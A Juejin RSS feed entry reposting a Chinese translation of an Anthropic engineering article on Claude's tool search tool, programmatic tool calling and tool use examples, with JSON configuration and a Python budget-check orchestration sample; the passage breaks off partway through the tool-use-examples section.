<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Claude 开发者平台推出高级工具使用功能]]></title>    <link>https://juejin.cn/post/7580295137395130383</link>    <guid>https://juejin.cn/post/7580295137395130383</guid>    <pubDate>2025-12-06T16:12:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580295137395130383" data-draft-id="7580312375372103720" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude 开发者平台推出高级工具使用功能"/> <meta itemprop="keywords" content="Claude"/> <meta itemprop="datePublished" content="2025-12-06T16:12:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="是魔丸啊"/> <meta itemprop="url" content="https://juejin.cn/user/3217622495411292"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude 开发者平台推出高级工具使用功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3217622495411292/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    是魔丸啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T16:12:36.000Z" title="Sat Dec 06 2025 16:12:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fadvanced-tool-use" target="_blank" title="https://www.anthropic.com/engineering/advanced-tool-use" ref="nofollow noopener noreferrer">转载</a></p>
<p>AI agents 的未来是模型能够无缝地跨越数百甚至数千个工具进行工作。一个集成了 git 操作、文件操作、包管理器、测试框架和部署流水线的 IDE 助手。一个同时连接 Slack、GitHub、Google Drive、Jira、公司数据库和数十个 MCP 服务器的运营协调器。</p>
<p>为了构建有效的 agents，它们需要能够使用无限的工具库，而无需预先将每个定义都填充到上下文中。我们关于使用 MCP 执行代码的博客文章讨论了工具结果和定义有时会在 agent 读取请求之前消耗 50,000+ 个 token。Agents 应该按需发现和加载工具，只保留与当前任务相关的内容。</p>
<p>Agents 还需要从代码中调用工具的能力。当使用自然语言工具调用时，每次调用都需要完整的推理过程，中间结果无论是否有用都会在上下文中堆积。代码是编排逻辑的自然选择，例如循环、条件和数据转换。Agents 需要根据手头的任务灵活选择代码执行和推理。</p>
<p>Agents 还需要从示例中学习正确的工具使用方法，而不仅仅是模式定义。JSON 模式定义了结构上有效的内容，但无法表达使用模式：何时包含可选参数、哪些组合有意义，或者您的 API 期望什么约定。</p>
<p>今天，我们推出了三个实现这一目标的功能：</p>
<ul>
<li><strong>工具搜索工具</strong>：允许 Claude 使用搜索工具访问数千个工具而不会消耗其上下文窗口</li>
<li><strong>程序化工具调用</strong>：允许 Claude 在代码执行环境中调用工具，减少对模型上下文窗口的影响</li>
<li><strong>工具使用示例</strong>：为演示如何有效使用特定工具提供了通用标准</li>
</ul>
<p>在内部测试中，我们发现这些功能帮助我们构建了使用传统工具使用模式无法实现的东西。例如，<strong>Claude for Excel</strong> 使用程序化工具调用读取和修改包含数千行的电子表格，而不会过载模型的上下文窗口。</p>
<p>基于我们的经验，我们相信这些功能为您可以用 Claude 构建的东西开辟了新的可能性。</p>
<h2 data-id="heading-0">工具搜索工具</h2>
<h3 data-id="heading-1">挑战</h3>
<p>MCP 工具定义提供了重要的上下文，但随着更多服务器的连接，这些 token 会累积起来。考虑一个五服务器设置：</p>
<ul>
<li>GitHub：35 个工具（约 26K tokens）</li>
<li>Slack：11 个工具（约 21K tokens）</li>
<li>Sentry：5 个工具（约 3K tokens）</li>
<li>Grafana：5 个工具（约 3K tokens）</li>
<li>Splunk：2 个工具（约 2K tokens）</li>
</ul>
<p>这是 58 个工具在对话开始前消耗约 55K tokens。添加更多服务器如 Jira（仅它就使用约 17K tokens），您很快就会接近 100K+ token 的开销。在 Anthropic，我们看到优化前工具定义消耗了 134K tokens。</p>
<p>但 token 成本不是唯一的问题。最常见的失败是错误的工具选择和不正确的参数，特别是当工具有相似名称时，如 <code>notification-send-user</code> vs <code>notification-send-channel</code>。</p>
<h3 data-id="heading-2">我们的解决方案</h3>
<p>工具搜索工具不是预先加载所有工具定义，而是按需发现工具。Claude 只看到它当前任务实际需要的工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7bd2974ddf24aae8dcc59d00b29f821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765642355&amp;x-signature=Zlhngw%2BL93tiIGHup6XT6542a7E%3D" alt="image.png" loading="lazy"/></p>
<p><em>与 Claude 传统方法的 122,800 tokens 相比，工具搜索工具保留了 191,300 tokens 的上下文。</em></p>
<p>传统方法：</p>
<ul>
<li>所有工具定义预先加载（50+ MCP 工具约 72K tokens）</li>
<li>对话历史和系统提示竞争剩余空间</li>
<li>总上下文消耗：开始任何工作前约 77K tokens</li>
</ul>
<p>使用工具搜索工具：</p>
<ul>
<li>仅工具搜索工具预先加载（约 500 tokens）</li>
<li>工具按需发现（3-5 个相关工具，约 3K tokens）</li>
<li>总上下文消耗：约 8.7K tokens，保留 95% 的上下文窗口</li>
</ul>
<p>这代表了 85% 的 token 使用减少，同时保持对完整工具库的访问。内部测试显示，在使用大型工具库时，MCP 评估的准确性显著提高。Opus 4 从 49% 提高到 74%，Opus 4.5 从 79.5% 提高到 88.1%。</p>
<h3 data-id="heading-3">工具搜索工具的工作原理</h3>
<p>工具搜索工具让 Claude 动态发现工具，而不是预先加载所有定义。您向 API 提供所有工具定义，但使用 <code>defer_loading: true</code> 标记工具使其可按需发现。延迟工具最初不会加载到 Claude 的上下文中。Claude 只看到工具搜索工具本身以及任何带有 <code>defer_loading: false</code> 的工具（您最关键、最常使用的工具）。</p>
<p>当 Claude 需要特定功能时，它会搜索相关工具。工具搜索工具返回匹配工具的引用，这些引用会在 Claude 的上下文中展开为完整定义。</p>
<p>例如，如果 Claude 需要与 GitHub 交互，它会搜索 "github"，只有 <code>github.createPullRequest</code> 和 <code>github.listIssues</code> 会被加载——而不是您来自 Slack、Jira 和 Google Drive 的其他 50+ 工具。</p>
<p>这样，Claude 可以访问您的完整工具库，而只需为其实际需要的工具支付 token 成本。</p>
<p><strong>提示缓存说明：</strong> 工具搜索工具不会破坏提示缓存，因为延迟工具完全从初始提示中排除。它们只在 Claude 搜索它们后才添加到上下文中，因此您的系统提示和核心工具定义保持可缓存。</p>
<p><strong>实现方式：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-comment">// 包含工具搜索工具（regex、BM25 或自定义）</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tool_search_tool_regex_20251119"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tool_search_tool_regex"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>

    <span class="hljs-comment">// 标记工具以按需发现</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github.createPullRequest"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Create a pull request"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"input_schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>...<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"defer_loading"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span>
    <span class="hljs-comment">// ... 数百个带有 defer_loading: true 的延迟工具</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>对于 MCP 服务器，您可以延迟加载整个服务器，同时保持特定高使用工具的加载：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"mcp_toolset"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mcp_server_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"google-drive"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"default_config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"defer_loading"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> # 延迟加载整个服务器
  <span class="hljs-attr">"configs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"search_files"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
<span class="hljs-attr">"defer_loading"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
    <span class="hljs-punctuation">}</span>  <span class="hljs-comment">// 保持最常用的工具加载</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Claude 开发者平台开箱即用地提供基于 regex 和 BM25 的搜索工具，但您也可以使用嵌入或其他策略实现自定义搜索工具。</p>
<h3 data-id="heading-4">何时使用工具搜索工具</h3>
<p>像任何架构决策一样，启用工具搜索工具涉及权衡。该功能在工具调用之前添加了搜索步骤，因此当上下文节省和准确性改进超过额外延迟时，它提供最佳 ROI。</p>
<p><strong>适用场景：</strong></p>
<ul>
<li>工具定义消耗 &gt;10K tokens</li>
<li>经历工具选择准确性问题</li>
<li>构建具有多个服务器的 MCP 驱动系统</li>
<li>有 10+ 个可用工具</li>
</ul>
<p><strong>不太适用场景：</strong></p>
<ul>
<li>小型工具库（&lt;10 个工具）</li>
<li>所有工具在每个会话中频繁使用</li>
<li>工具定义紧凑</li>
</ul>
<h2 data-id="heading-5">程序化工具调用</h2>
<h3 data-id="heading-6">挑战</h3>
<p>传统工具调用在工作流变得更复杂时产生两个基本问题：</p>
<ul>
<li><strong>中间结果污染上下文</strong>：当 Claude 分析 10MB 日志文件的错误模式时，整个文件进入其上下文窗口，尽管 Claude 只需要错误频率的摘要。当获取跨多个表的客户数据时，每条记录在上下文中累积，无论相关性如何。这些中间结果消耗大量 token 预算，并可能完全将重要信息推出上下文窗口。</li>
<li><strong>推理开销和手动综合</strong>：每个工具调用需要完整的模型推理过程。收到结果后，Claude 必须"目视检查"数据以提取相关信息，推理各部分如何组合，并决定下一步做什么——所有这些都通过自然语言处理。五工具工作流意味着五次推理过程加上 Claude 解析每个结果、比较值和综合结论。这既慢又容易出错。</li>
</ul>
<h3 data-id="heading-7">我们的解决方案</h3>
<p>程序化工具调用使 Claude 能够通过代码而不是通过单独的 API 往返来编排工具。Claude 不是逐一请求工具，每个结果都返回到其上下文，而是编写调用多个工具、处理它们的输出并控制哪些信息实际进入其上下文窗口的代码。</p>
<p>Claude 擅长编写代码，通过让它用 Python 而不是通过自然语言工具调用来表达编排逻辑，您获得更可靠、精确的控制流。循环、条件、数据转换和错误处理都在代码中明确，而不是在 Claude 的推理中隐含。</p>
<h4 data-id="heading-8">示例：预算合规检查</h4>
<p>考虑一个常见的业务任务："哪些团队成员超出了他们的 Q3 差旅预算？"</p>
<p>您有三个可用工具：</p>
<ul>
<li><code>get_team_members(department)</code> - 返回团队成员列表，包含 ID 和级别</li>
<li><code>get_expenses(user_id, quarter)</code> - 返回用户的费用行项目</li>
<li><code>get_budget_by_level(level)</code> - 返回员工级别的预算限制</li>
</ul>
<p><strong>传统方法</strong>：</p>
<ul>
<li>获取团队成员 → 20 人</li>
<li>对每个人，获取他们的 Q3 费用 → 20 次工具调用，每次返回 50-100 个行项目（航班、酒店、餐食、收据）</li>
<li>按员工级别获取预算限制</li>
<li>所有这些都进入 Claude 的上下文：2000+ 费用行项目（50 KB+）</li>
<li>Claude 手动汇总每个人的费用，查找他们的预算，比较费用与预算限制</li>
<li>更多的模型往返，显著的上下文消耗</li>
</ul>
<p><strong>使用程序化工具调用</strong>：</p>
<p>每个工具结果不是返回到 Claude，Claude 编写编排整个工作流的 Python 脚本。脚本在代码执行工具（沙盒环境）中运行，当需要来自您的工具的结果时暂停。当您通过 API 返回工具结果时，它们由脚本处理，而不是由模型消费。脚本继续执行，Claude 只看到最终输出。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/732ab5c8b9a84f498bdf9147dc038d30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765642355&amp;x-signature=sQo8jJAegkIAL1cfMH%2BUxDp1TAQ%3D" alt="" loading="lazy"/></p>
<p>程序化工具调用使 Claude 能够通过代码而不是通过单独的 API 往返来编排工具，允许并行工具执行。</p>
<p>以下是 Claude 用于预算合规任务的编排代码：</p>
<pre><code class="hljs language-python" lang="python">team = <span class="hljs-keyword">await</span> get_team_members(<span class="hljs-string">"engineering"</span>)

<span class="hljs-comment"># 为每个唯一级别获取预算</span>
levels = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(m[<span class="hljs-string">"level"</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> team))
budget_results = <span class="hljs-keyword">await</span> asyncio.gather(*[
    get_budget_by_level(level) <span class="hljs-keyword">for</span> level <span class="hljs-keyword">in</span> levels
])

<span class="hljs-comment"># 创建查找字典：{"junior": budget1, "senior": budget2, ...}</span>
budgets = {level: budget <span class="hljs-keyword">for</span> level, budget <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(levels, budget_results)}

<span class="hljs-comment"># 并行获取所有费用</span>
expenses = <span class="hljs-keyword">await</span> asyncio.gather(*[
    get_expenses(m[<span class="hljs-string">"id"</span>], <span class="hljs-string">"Q3"</span>) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> team
])

<span class="hljs-comment"># 找出差旅预算超支的员工</span>
exceeded = []
<span class="hljs-keyword">for</span> member, exp <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(team, expenses):
    budget = budgets[member[<span class="hljs-string">"level"</span>]]
    total = <span class="hljs-built_in">sum</span>(e[<span class="hljs-string">"amount"</span>] <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> exp)
    <span class="hljs-keyword">if</span> total &gt; budget[<span class="hljs-string">"travel_limit"</span>]:
        exceeded.append({
            <span class="hljs-string">"name"</span>: member[<span class="hljs-string">"name"</span>],
            <span class="hljs-string">"spent"</span>: total,
            <span class="hljs-string">"limit"</span>: budget[<span class="hljs-string">"travel_limit"</span>]
        })

<span class="hljs-built_in">print</span>(json.dumps(exceeded))
</code></pre>
<p>Claude 的上下文只接收最终结果：两到三个预算超支的人。2000+ 行项目、中间汇总和预算查找不会影响 Claude 的上下文，将消耗从 200KB 原始费用数据减少到仅 1KB 结果。</p>
<p>效率收益是巨大的：</p>
<ul>
<li><strong>Token 节省</strong>：通过保持中间结果不在 Claude 的上下文中，PTC 显著减少 token 消耗。复杂研究任务的平均使用量从 43,588 个 token 下降到 27,297 个 token，减少了 37%。</li>
<li><strong>减少延迟</strong>：每次 API 往返需要模型推理（几百毫秒到几秒）。当 Claude 在单个代码块中编排 20+ 工具调用时，您消除了 19+ 次推理过程。API 处理工具执行而无需每次返回模型。</li>
<li><strong>提高准确性</strong>：通过编写明确的编排逻辑，Claude 比用自然语言处理多个工具结果时犯更少的错误。内部知识检索从 25.6% 提高到 28.5%；GIA 基准从 46.5% 提高到 51.2%。</li>
</ul>
<p>生产工作流涉及复杂的数据、条件逻辑和需要扩展的操作。程序化工具调用让 Claude 以编程方式处理该复杂性，同时保持其对可操作结果的关注，而不是原始数据处理。</p>
<h3 data-id="heading-9">程序化工具调用的工作原理</h3>
<h4 data-id="heading-10">1. 将工具标记为可从代码调用</h4>
<p>向工具添加 code_execution，并设置 allowed_callers 以选择加入程序化执行的工具：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_execution_20250825"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_execution"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_team_members"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Get all members of a department..."</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"input_schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>...<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"allowed_callers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"code_execution_20250825"</span><span class="hljs-punctuation">]</span> # 选择加入程序化工具调用
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_expenses"</span><span class="hljs-punctuation">,</span>
	...
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_budget_by_level"</span><span class="hljs-punctuation">,</span>
	...
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>API 将这些工具定义转换为 Claude 可以调用的 Python 函数。</p>
<h4 data-id="heading-11">2. Claude 编写编排代码</h4>
<p>Claude 不是逐一请求工具，而是生成 Python 代码：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"server_tool_use"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"srvtoolu_abc"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_execution"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"input"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"team = get_team_members('engineering')\n..."</span> # 上面的代码示例
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-12">3. 工具执行而不影响 Claude 的上下文</h4>
<p>当代码调用 get_expenses() 时，您收到带有 caller 字段的工具请求：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tool_use"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"toolu_xyz"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_expenses"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"input"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"user_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"emp_123"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"quarter"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Q3"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"caller"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_execution_20250825"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"tool_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"srvtoolu_abc"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>您提供结果，该结果在代码执行环境中处理，而不是在 Claude 的上下文中。此请求-响应循环对代码中的每个工具调用重复。</p>
<h4 data-id="heading-13">4. 只有最终输出进入上下文</h4>
<p>当代码完成运行时，只有代码的结果返回给 Claude：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_execution_tool_result"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"tool_use_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"srvtoolu_abc"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"stdout"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"[{\"name\": \"Alice\", \"spent\": 12500, \"limit\": 10000}...]"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这就是 Claude 看到的全部内容，而不是沿路处理的 2000+ 费用行项目。</p>
<h3 data-id="heading-14">何时使用程序化工具调用</h3>
<p>程序化工具调用为工作流添加了代码执行步骤。当 token 节省、延迟改进和准确性收益显著时，这种额外开销得到回报。</p>
<p><strong>最佳适用场景：</strong></p>
<ul>
<li>处理大型数据集，只需要聚合或摘要</li>
<li>运行具有三个或更多依赖工具调用的多步骤工作流</li>
<li>在 Claude 看到之前过滤、排序或转换工具结果</li>
<li>处理中间数据不应影响 Claude 推理的任务</li>
<li>在许多项目上运行并行操作（例如，检查 50 个端点）</li>
</ul>
<p><strong>不太有益时：</strong></p>
<ul>
<li>进行简单的单工具调用</li>
<li>Claude 应该看到并推理所有中间结果的任务</li>
<li>运行具有小响应的快速查找</li>
</ul>
<h2 data-id="heading-15">工具使用示例</h2>
<h3 data-id="heading-16">挑战</h3>
<p>JSON Schema 擅长定义结构——类型、必填字段、允许的枚举——但它无法表达使用模式：何时包含可选参数、哪些组合有意义，或者您的 API 期望什么约定。</p>
<p>考虑支持工单 API：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"create_ticket"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"input_schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
